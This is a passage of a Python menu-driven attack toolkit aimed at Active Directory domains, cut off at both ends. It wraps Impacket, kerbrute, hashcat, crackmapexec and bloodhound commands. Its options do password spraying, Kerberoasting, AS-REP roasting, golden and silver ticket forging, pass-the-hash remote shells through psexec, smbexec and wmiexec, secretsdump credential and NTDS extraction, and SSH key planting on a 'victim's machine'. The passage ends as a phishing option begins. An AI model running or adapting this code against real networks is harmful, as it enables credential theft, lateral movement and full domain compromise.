            command("mv topusers.tmp usernames.txt")
            
            command("cat hashes.txt >> tophash.tmp")
            command("rm hashes.txt")
            command("mv tophash.tmp hashes.txt")

            cleanusers()
            linecache.checkcache(filename=None)
            
            for x in range (0, maximum):
               USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
               USER[x] = padding(USER[x], COL3)
               
               PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
               PASS[x] = padding(PASS[x], COL4)

            count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS                                  
            for x in range(0, count):
               validname2 = linecache.getline("rvalid.tmp", x + 1).rstrip("\n")
               
               for y in range(0, maximum):
                  checkuser2 = linecache.getline("usernames.txt", y + 1).rstrip("\n")
                  if validname2 == checkuser2:
                     VALD[y] = 1							# ASSIGN A TOKEN TO THIS USER
         else:
            print("No users where found, check that the domain name is correct...")     
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
# -------------------------------------------------------------------------------------

   if selection =='42':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         found = 0
         print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
         command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.tmp")

         test1 = linecache.getline("bpassword1.tmp", 1)
         test1 = test1.rstrip("\n")
         if test1 != "":
            found = 1
            USR,PAS = test1.split(":")
            if len(USR) < COL1: USR = padding(USR, COL1)
            if len(PAS) < COL1: PAS = padding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying all usernames with matching passwords...")
            command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.tmp")
         
         test2 = linecache.getline("bpassword2.tmp", 1)
         test2 = test2.rstrip("\n")
         if test2 != "":
            found = 1
            USR,PAS = test2.split(":")
            if len(USR) < COL1: USR = padding(USR, COL1)
            if len(PAS) < COL1: PAS = padding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying all users with random passwords, please wait as this could take sometime...")
            
            with open("passwords.txt","r") as read:
               for line in read:
                  line = line.rstrip("\n")
                  if line != "":
                     command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + line + " -outputfile bpassword3.tmp > log.tmp") 
                  
                     test3 = linecache.getline("bpassword3.tmp", 1)
                     test3 = test3.rstrip("\n")                                    
                                    
                     if test3 != "":
                        USRX,PASX = test3.split(":") 
                        print("[+] User " + USRX + " has associated password " + PASX + "...")
                        os.remove("bpassword3.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         if linecache.getline('usernames.txt', 1) != " ":
            command(keypath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
            print("[*] Cracking hash values if they exists...\n")
            command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
            command("strings cracked1.txt")
         else:
            print("[-] The file usernames.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='44':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         if linecache.getline('usernames.txt', 1) != " ":
            command(keypath + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
            print("[*] Cracking hash values if they exists...\n")
            command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
            command("strings cracked2.txt")
         else:
            print("[-] The file usernames.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if TIP[:5] != "EMPTY" and PAS[:1] != "\"":
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")
         for x in range(0, maximum):
            if USER[x].rstrip(" ") == USR.rstrip(" "): PASS[x] = NTM.rstrip(" ") # RESET USERS HASH
         NTM = padding(NTM, COL1)
      else:
         print("[-] Password not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      checkParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         checkParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         checkParams = 1

      if checkParams != 1:
         print("[*] Attempting to generate ticket for user " + USR.rstrip(" ") + "...")

         if NTM[:1] != "":
            print("[+] Using current associated hash...")
            command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " > log.tmp")
            
            command("sed -i '1d' log.tmp")
            command("sed -i '1d' log.tmp")            
            
            checkFile = linecache.getline('log.tmp', 1)
            
            if "[*] Saving ticket" in checkFile:
               print("[+] Saving ticket in " + USR.rstrip(" ") + ".ccache")
               command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
               checkParams = 1
            else:
               print("[-] Current associated hash is not valid...")
           
         if checkParams != 1:
            count = len(open('hashes.txt').readlines())
            if count > 0:
               print("[*] Please wait, bruteforcing using " + str(count) + " found hashes...")

               with open("hashes.txt", "r") as read:
                  for line in read:
                     line = line.rstrip("\n")
                     command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + line.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " > log2.tmp")

                     command("sed -i '1d' log2.tmp")
                     command("sed -i '1d' log2.tmp")
                        
                     linecache.clearcache()
                     checkFile2 = linecache.getline('log2.tmp', 1)
                                               
                     if "[*] Saving ticket in " in checkFile2:
                        print("[+] Saving ticket in " + USR.rstrip(" ") + ".ccache")
                        print("[i] A valid hash for " + USR.rstrip(" ") + " is " + line + "...")                          
                        command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
                        checkParams = 2
                        break
                                                      
                     if "Clock skew too great" in checkFile2:
                        print("[-] Clock skew too great, terminating...")
                        checkParams = 2
                        break
               if checkParams != 2:
                  print("[-] Hashes.txt exhausted...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Pass the Ticket.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      print("[*] Sorry, Pass-the-Ticket has not been implemented yet...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Trying user " + USR.rstrip(" ") + "...\n")

         if (NTM[:1] != "") & (SID[:1] != ""):
            command(keypath + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
         else:
            print("[-] Hash or Domain-SID not found...")

         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
            command(keypath + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
         else:
             print("[-] Silver TGT was not generated...")      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Details : Golden Ticket!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Trying user " + USR.rstrip(" ") + "...\n")

         if (NTM[:1] != "") & (SID[:1] != ""):
            command(keypath + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
         else:
            command("echo 'Hash or Domain-SID not found...'")

         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
            command(keypath + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
         else:
            print("[-] Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='50':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
         command(keypath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='51':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
         print("[*] Checking downloaded files: \n")
         command("ls -la ./" + DIR.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      CheckParams = 0
      
      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1
      
      if CheckParams != 1:
         print ("[*] Enumerating, please wait...")     
         if PAS[:2] != "''":
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
         else:
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         BH1 = input("[+] Enter Neo4j username: ")
         BH2 = input("[+] Enter Neo4j password: ")
         if BH1 != "" and BH2 != "":
            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s -dry")
         else:
            print("[-] Username or password cannot be null...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.   if PAS[:2] != "''":
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("Enumerating, please wait...\n")
         if PAS[:2] != "''":
            command(keypath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
         else:
            command(keypath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > SECRETS.tmp")

         command("sed -i '/:::/!d' SECRETS.tmp")			# TIDY UP FILE READY FOR READING
         count = len(open('SECRETS.tmp').readlines())

         cleanusers()         
         for x in range(0, count):
            data = linecache.getline("SECRETS.tmp", x + 1)
            data = data.replace(":::","")				# DELETE THIS LINE?
            temp = DOM.rstrip(" ") + "\\"				# TIDY UP THE DATA
            data = data.replace(temp,"")
            temp = DOM.rstrip(" ") + ".LOCAL\\"
            data = data.replace(temp,"")

            try:
               get1,get2,get3,get4 = data.split(":") 
            except ValueError:
               if get1 == "":
                  get1 == "Error..."
               if get2 == "":
                  get2 == "Error..."
               if get3 == "":
                  get3 == "Error..."
               if get4 == "":
                  get4 == "Error..."

            get1 = get1.rstrip("\n")
            get2 = get1.rstrip("\n")
            get3 = get1.rstrip("\n")
            get4 = get4.rstrip("\n")

            print(colored("[+] Found User " + get1,colour2))
            USER[x] = get1[:COL3]
            USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
            PASS[x] = get4[:COL4]         
            
            if len(USER[x]) < COL1: USER[x] = padding(USER[x], COL3) 			# USER
            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD

         for z in range(0, maximum):
            if USER[z].rstrip(" ") == USR.rstrip(" "):
               NTM = PASS[z]			# RESET DISPLAY HASH
               if len(NTM) < COL1: NTM = padding(NTM, COL1)

         os.remove("SECRETS.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      CheckParams = 0

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         if PAS[:2] != "''":
            print("[*] Enumerating, please wait...")
            print("[+] Other exploitable machines on the same subnet...\n")
            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
         
            print("[+] Trying specified windows command...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'whoami /all'")

            print("[+] Trying to enumerate users and shares...\n")  
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
         
            print("[+] Trying a few other command while I am here...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
         else:
            print("[*] Enumerating, please wait...")          
            print("[+] Other exploitable machines on the same subnet...\n")
            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
         
            print("[+] Trying specified windows command...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'whoami /all'")

            print("[+] Trying to enumerate users and shares...\n")  
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --shares")
         
            print("[+] Trying a few other command while I am here...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'net user Administrator /domain'")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -X '$PSVersionTable'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
         command(keypath + "psexec.py -hashes :" + NTM.rstrip("\n") + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
         command(keypath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
         command(keypath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()     

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
      CheckParams = 0
      
      print("[*] Checking work folder for relevant files...")

      if os.path.exists("./" + DIR.rstrip(" ") + "/ntds.dit"):
         print("[+] File ntds.dit found...")
      else:
         print("[-] File ntds.dit not found...")
         CheckParams = 1
         
      if os.path.exists("./" + DIR.rstrip(" ") + "/SYSTEM"):
         print("[+] File SYSTEM found...")
      else:
         print("[-] File SYSTEM not found...")
         CheckParams = 1         

      if os.path.exists("./" + DIR.rstrip(" ") + "/SECURITY"):
         print("[+] File SECURITY found...")
      else:
         print("[-] File SECURITY not found")
         CheckParams = 1       
         
      if CheckParams != 1:
         print("[*] Extracting secrets, please wait...")
         command(keypath + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
         
         print("[*] Importing the data...")
         command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > usernames.txt")
         command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > hashes.txt")
         
         for x in range (0, maximum):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
            USER[x] = padding(USER[x], COL3)
         
         for x in range (0, maximum):
            PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
            PASS[x] = padding(PASS[x], COL4)
             
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - SSH GEN GENERATION
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      print("[*] Generating Keys...\n")
      command("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
      command("tput setaf 2; tput bold")
      command("cat id_rsa.pub")
      command("tput sgr0; tput dim")
      print("[+] Insert the above into authorized_keys on the victim's machine...")
      if USR[:2] == "''":
         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
      else:
         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      CheckParams = 0
   
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1   
   
      if CheckParams != 1:
         if WEB[:1] != "":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[+] User list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[+] User list generated via ip address...")

         if os.path.exists("/usr/share/ncrack/minimal.usr"):
            command("cat /usr/share/ncrack/minimal.usr >> usernames.txt 2>&1")
            command("sed -i '/#/d' usernames.txt 2>&1")
            command("sed -i '/Email addresses found/d' usernames.txt 2>&1")
            command("sed -i '/---------------------/d' usernames.txt 2>&1")
            print("[+] Adding NCrack minimal.usr list as well...")

         for x in range (0,maximum):
            USER[x] = linecache.getline("usernames.txt", x+1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      CheckParams = 0  
   
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1   
      
      if CheckParams != 1:
         if WEB[:1] != "":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[+] Password list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[+] Password list generated via ip address...")

         if os.path.exists("/usr/share/ncrack/minimal.usr"):
            command("cat /usr/share/ncrack/minimal.usr >> passwords.txt 2>&1")
            command("sed -i '/#/d' passwords.txt 2>&1")
            command("sed -i '/Email addresses found/d' passwords.txt 2>&1")
            command("sed -i '/---------------------/d' passwords.txt 2>&1")
            print("[+] Adding NCrack minimal.usr list as well...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Nano usernames.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      command("nano usernames.txt")
      
      for x in range (0, maximum):
         USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
         USER[x] = padding(USER[x], COL3)
         
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Nano passwords.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      command("nano passwords.txt")
      
      for x in range (0, maximum):
         PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
         PASS[x] = padding(PASS[x], COL4)     
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Editor  hashes.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      command("nano hashes.txt")
           
      for x in range (0, maximum):
            PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
            PASS[x] = padding(PASS[x], COL4)
            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Editor hosts.conf
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='66':
      command("nano /etc/hosts")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Mr Phiser is experimental!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if DOM[:5] == "EMPTY":
         print("[-] Remote mail.server has not been specified...")
         CheckParams = 1
      
      if "25" not in POR:
